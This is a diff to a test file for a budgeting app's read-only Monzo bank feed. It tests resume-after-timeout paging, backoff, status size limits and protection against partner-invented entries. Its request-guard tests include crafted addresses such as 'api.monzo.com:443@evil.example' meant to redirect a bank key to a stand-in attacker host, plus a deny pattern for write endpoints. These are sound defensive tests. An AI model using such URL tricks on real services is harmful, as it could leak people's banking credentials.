+  ok("Q3: and then reads just the last 35 days", (NOW += 15 * 60000, G.c.bankPoll(), /since=20/.test(reqs.filter(r => /\/transactions\?/.test(r.url)).pop().url)));
+  // the 5 minutes run out between the two runs: the history read so far stays, and the last 90 days come in
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.pageDelay = 30000;
+  G = bankEnv(); connectMonzo(G);
+  monzo.pageDelay = 0; monzo.historyClosed = true; monzo.strictCursor = true; NOW += 60000; G.c.bankPendingImports();
+  let sb = G.call({key: G.kE, action: "bank.status"}).bank; st = JSON.parse(G.env.props.BANK_STATUS_ethan);
+  ok("Q3: Monzo's 5 minutes ran out before it could carry on: what it read stays, with the last 90 days", bigRows(G).length === 837 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_big0799") && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco") && st.fullDone && !st.cursor && /part-way/.test(sb.note) && /up to 2026-03-10/.test(sb.note) && sb.connected, {n: bigRows(G).length, note: sb.note, err: sb.lastError});
+  // the 5 minutes run out in the middle of one read
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = bigHistory(); monzo.closeAfter = 5;
+  G = bankEnv(); connectMonzo(G);
+  sb = G.call({key: G.kE, action: "bank.status"}).bank;
+  ok("Q3: Monzo stopping part-way through one read keeps the pages it gave", bigRows(G).length === 537 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_big0000") && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco") && /part-way/.test(sb.note) && /up to 2025-05-14/.test(sb.note) && sb.connected, {n: bigRows(G).length, note: sb.note, err: sb.lastError});
+}
+
+{
+  // Q5: a Retry-After that's a date, or nonsense, or a year, still backs off sensibly (not never, not forever)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const backoff = (ra) => { monzo.rate = true; monzo.retryAfter = ra; NOW += 31000; G.call({key: G.kE, action: "bank.syncNow"}); monzo.rate = false; const st = JSON.parse(G.env.props.BANK_STATUS_ethan), until = st.backoffUntil; st.backoffUntil = 0; st.backoffN = 0; G.env.props.BANK_STATUS_ethan = JSON.stringify(st); return until - NOW; };
+  const a = backoff(new RealDate(NOW + 31000 + 3 * 3600000).toUTCString()), b = backoff("soon"), c = backoff("31536000");
+  ok("Q5: a date in Retry-After is waited for", a >= 3 * 3600000 - 2000 && a <= 3 * 3600000 + 2000, {a});
+  ok("Q5: nonsense still backs off", b > 20 * 60000, {b});
+  ok("Q5: and never for more than a day", c <= 86400000, {c});
+}
+
+{
+  // Q6: years of history with holds that never settled don't fill up the status (a property holds 9 KB at most)
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
+  const old = []; for (let i = 0; i < 400; i++) old.push(mtx("tx_oldhold" + String(i).padStart(3, "0"), B.addDays("2025-01-01", i % 300), -(500 + i), {merchant: merchant("Hotel " + i, "holidays"), category: "holidays", pending: true}));
+  monzo.txns = old.concat(monzoData(planned));
+  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
+  const st = G.env.props.BANK_STATUS_ethan, pend = Object.keys(JSON.parse(st).pending || {});
+  ok("Q6: only recent holds are watched, so the status stays small", st.length < 9000 && pend.length === 1 && pend[0] === "tx_shell", {size: st.length, n: pend.length});
+}
+{
+  // Q7: a "payment between you" your partner makes up can't hide one of your bank payments
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
+  const G = bankEnv();
+  const made = G.call({key: G.kS, ops: [{op: "put", table: "settlements", row: {id: "set-fake", date: "2026-11-06", from: "ethan", to: "sophie", amount: 20, note: "Ethan paid me back"}}]});
+  connectMonzo(G, {acc_00009main: "e-main"});
+  ok("Q7: the made-up one doesn't hide Ethan's payment to a friend", made.applied.length === 1 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_friend" && !r.deleted), made);
+  freshMonzo(); monzo.txns = monzoData(planned);
+  const G2 = bankEnv(), mine = G2.call({key: G2.kE, ops: [{op: "put", table: "settlements", row: {id: "set-real", date: "2026-11-06", from: "ethan", to: "sophie", amount: 20, note: "paid Sophie back"}}]});
+  connectMonzo(G2, {acc_00009main: "e-main"});
+  ok("Q7: one Ethan logged himself still counts", mine.applied.length === 1 && !grow(G2, "transactions").some(r => r.id === "bk-monzo-tx_friend"));
+}
+
+{
+  // Q9: carrying on a first read over two current accounts: each picks up where it was, and one already read to the
+  // end is never read from the start again
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
+  const G = bankEnv(), asked = [];
+  const page = (acc, from) => Array.from({length: 100}, (_, i) => ({id: "tx_" + acc + "_" + String(from + i).padStart(4, "0"), created: iso(B.addDays("2024-01-01", from + i)), settled: iso("2024-01-01"), amount: -100, merchant: {name: "Shop"}, category: "general", metadata: {}}));
+  G.c.monzoGet_ = (p, path, q) => {
+    if (path === "/accounts") return {accounts: [{id: "accA", type: "uk_retail"}, {id: "accB", type: "uk_retail"}]};
+    if (path === "/balance") return {balance: 100}; if (path === "/pots") return {pots: []};
+    asked.push(q.account_id + ":" + (q.since || "")); NOW += 60000;   // each page takes a minute
+    if (q.since && !/^tx_/.test(q.since)) return {transactions: []};   // nothing in the last 35 days
+    const n = /^tx_/.test(q.since || "") ? +q.since.slice(-4) + 1 : 0; return {transactions: n >= 300 ? [] : page(q.account_id, n)};
+  };
+  G.c.bankStart_();
+  const r1 = G.c.monzoRead_("ethan", true, false, null, NOW + 3.5 * 60000);
+  ok("Q9: the first run reads the first account to the end and stops part-way through the second", JSON.stringify(r1.cursor) === JSON.stringify({accB: "tx_accB_0099"}), r1.cursor);
+  asked.length = 0;
+  const r2 = G.c.monzoRead_("ethan", true, false, r1.cursor, NOW + 30000);
+  ok("Q9: then the finished account only gets its last 35 days, and the other carries on from where it was", /^accA:20/.test(asked[0]) && asked.indexOf("accB:tx_accB_0099") >= 0 && !asked.some(a => /^accA:(tx_|$)/.test(a)), asked);
+  ok("Q9: and running out of time again never puts the finished account back to the start", r2.cursor && r2.cursor.accA === undefined && /^tx_accB_/.test(r2.cursor.accB), r2.cursor);
+  // the other way round: the first account still has more, the second was finished
+  const r3 = G.c.monzoRead_("ethan", true, false, {accA: "tx_accA_0099"}, NOW + 30000);
+  ok("Q9: a finished account after the one that ran out of time stays finished", r3.cursor && /^tx_accA_/.test(r3.cursor.accA) && r3.cursor.accB === undefined, r3.cursor);
+}
+
+{
+  // Q10: made-up shops aimed at the payer's history, or at lots of payments, can't fill the payer's status or list
+  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
+  const hist = []; for (let i = 0; i < 120; i++) hist.push(mtx("tx_q10_" + i, B.addDays(i < 60 ? "2026-07-01" : "2026-10-27", i % 60 % 20), -(1000 + i), {merchant: merchant("Tesco", "groceries"), category: "groceries"}));
+  monzo.txns = hist.concat(monzoData(planned));
+  const G = bankEnv();
+  const pkS = JSON.parse(Buffer.from(G.c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k;
+  const ops = hist.map(t => ({op: "put", table: "transactions", row: {id: "t-pk-" + t.id, date: t.created.slice(0, 10), person: "sophie", amount: -t.amount / 100, budget: "s-food", account: "s-main", split: "half", note: "Tesco", source: "peckish"}}));
+  G.call({key: pkS, ops: ops});
+  connectMonzo(G, {acc_00009main: "e-main"});
+  const st = JSON.parse(G.env.props.BANK_STATUS_ethan), peers = Object.keys(st.peers || {});
+  const hinted = grow(G, "transactions").filter(r => /^bk-monzo-tx_q10_/.test(r.id) && r.splitHint === "half");
+  ok("Q10: payments from before the payer started Budgie are never matched to the partner's shops", !hinted.some(r => r.date < "2026-10-26"), hinted.filter(r => r.date < "2026-10-26").map(r => r.id));
+  ok("Q10: and only a few wait at a time", peers.length <= 40 && hinted.length <= 40 && G.env.props.BANK_STATUS_ethan.length < 9000, {peers: peers.length, hinted: hinted.length, size: G.env.props.BANK_STATUS_ethan.length});
+}
+
 // ================= read only, always =================
 const allowedPost = ["https://api.monzo.com/oauth2/token", "https://api.monzo.com/oauth2/logout"];
 const bad = reqs.filter(r => { const u = new URL(r.url); return !(r.method === "get" || (r.method === "post" && allowedPost.indexOf(u.origin + u.pathname) >= 0)); });
@@ -515,13 +854,19 @@ ok("the request guard refuses writes", guard("put", "https://api.monzo.com/pots/
   guard("post", "https://api.starlingbank.com/api/v2/identity/token") && guard("post", "https://api.monzo.com/oauth2/token/../../pots/x/deposit") && guard("post", "https://api.monzo.com/oauth2/tokenx"));
 ok("but lets sign in and logout through", !guard("post", "https://api.monzo.com/oauth2/token") && !guard("post", "https://api.monzo.com/oauth2/logout") && !guard("get", "https://api.monzo.com/accounts"));
 ok("and other hosts", guard("get", "https://evil.example/") && guard("get", "https://api.monzo.com.evil.example/x") && guard("get", "https://user@api.monzo.com/x") && guard("get", "http://api.monzo.com/accounts"));
+// Q4: the whole address is checked, so a port or a user@ part can't send a bank key somewhere else
+ok("Q4: an address that only starts like Monzo's is refused", guard("get", "https://api.monzo.com:443@evil.example/x") && guard("get", "https://api.monzo.com#@evil.example/") && guard("get", "https://api.monzo.com:8080/accounts") && guard("get", "https://api.monzo.com/x@evil.example") && !guard("get", "https://api.monzo.com/transactions?account_id=acc_1&since=2026-01-01T00%3A00%3A00.000Z&expand%5B%5D=merchant"));
 // the code itself: one way out, and no write method anywhere
 ok("BankFeeds.gs has a single UrlFetchApp.fetch", (SRC.match(/UrlFetchApp\.fetch\s*\(/g) || []).length === 1 && /function bankHttp_[\s\S]*?UrlFetchApp\.fetch/.test(SRC.slice(SRC.indexOf("function bankHttp_"), SRC.indexOf("function bankErr_"))));
 const methods = (SRC.match(/bankHttp_\(\s*"([a-z]+)"/g) || []).map(m => m.match(/"([a-z]+)"/)[1]);
 ok("every request in BankFeeds.gs is a GET or POST", methods.length >= 6 && methods.every(m => m === "get" || m === "post"), methods);
 ok("BankFeeds.gs never names a write endpoint", !/\/(deposit|withdraw)\b|\/attachment|transaction-receipts|\/webhooks|payments\/local|"\/feed"/.test(SRC));
 const posts = (SRC.match(/bankHttp_\(\s*"post"[^)]*/g) || []);
-ok("the only POSTs are Monzo token and logout", posts.length === 3 && posts.every(p => /MONZO_API_ \+ "\/oauth2\/(token|logout)"/.test(p)), posts);
+ok("the only POSTs are Monzo token and logout", posts.length >= 3 && posts.every(p => /MONZO_API_ \+ "\/oauth2\/(token|logout)"/.test(p)), posts);
+
+// Q8: the tab the Monzo sign-in opens in can't reach back into Budgie (window.opener)
+const APPJS = fs.readFileSync(path.join(__dirname, "../app.js"), "utf8");
+ok("Q8: every tab Budgie opens for a bank sign-in drops its opener", (APPJS.match(/window\.open\(/g) || []).length === (APPJS.match(/window\.open\([^;]*\);\s*(\/\/[^\n]*\n\s*)?try \{ if \(w\) w\.opener = null; \}/g) || []).length);
 
 // ================= no secrets anywhere they shouldn't be =================
 const secrets = Object.values(SECRET).concat(["acc-ETHAN-3-eeeeeeee", "ref-ETHAN-3-ffffffff", "acc-ETHAN-4-gggggggg"]);
